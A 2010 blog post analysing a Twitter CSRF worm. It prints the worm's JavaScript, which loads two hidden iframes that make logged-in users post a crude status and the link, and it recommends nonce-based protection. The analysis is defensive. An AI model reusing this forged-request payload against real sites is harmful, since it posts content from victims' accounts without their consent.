---
author: admin
comments: true
date: 2010-09-26 18:39:12+00:00
layout: post
slug: csrf-matters-or-why-twitter-users-dont-actually-love-anal-sex-with-goats
title: 'CSRF Matters (Or: Why Twitter Users Don''t Actually Love Anal Sex With Goats)'
wordpress\_id: 1358
tags:
- csrf
- twitter
---

**Update:** Twitter has disabled this vector by removing the /share/update method to automatically tweet a status.  This will prevent future attacks of this type.[^1]

A new "worm" is making the rounds on Twitter this morning, driven by a t.co link.  At first glance this might seem to be a flaw similar to the one from just a few days ago, but it's not.  Let's take a look at the payload.


```javascript
var el1 = document.createElement('iframe');
var el2 = document.createElement('iframe');
el1.style.visibility="hidden";
el2.style.visibility="hidden";
el1.src = "http://twitter.com/share/update?status=WTF:%20" + window.location;
el2.src = "http://twitter.com/share/update?status=i%20love%20anal%20sex%20with%20goats";
document.getElementsByTagName("body")[0].appendChild(el1);
document.getElementsByTagName("body")[0].appendChild(el2);
```


Amazingly simple right?  All the page does is create two hidden iframes, set their src to be a URL that will tweet those two updates, then appends them to the body of the page.  From the user's perspective all that happens is a blank page when they click the link, but in reality it has just sent a copy of its own URL + "i love anal sex with goats" back to Twitter.  This will only work if you're currently logged in, but that's not much of an obstacle.

So how do you stop cross site request forgery (CSRF) requests like this?  One way is to generate a nonce for requests and require it to be sent along when triggering an update.[^2]  That would have stopped this worm in its tracks, but at the expense of disabling easy updates to Twitter from other websites.

Given the rapid rise of Twitter and people's increasing reliance on the sanctity of their timelines this type of attack will almost certainly become more common until Twitter chooses to change their rules.  As always, the tradeoff of convenience and security is a tough decision.

[^1]: Other potential vectors like /home?status require user interaction, so alternate methods will have to be developed by worm authors.
[^2]: [OWASP](http://www.owasp.org/index.php/Main_Page) has more information and reference implementations to protect against CSRF, XSS, and more
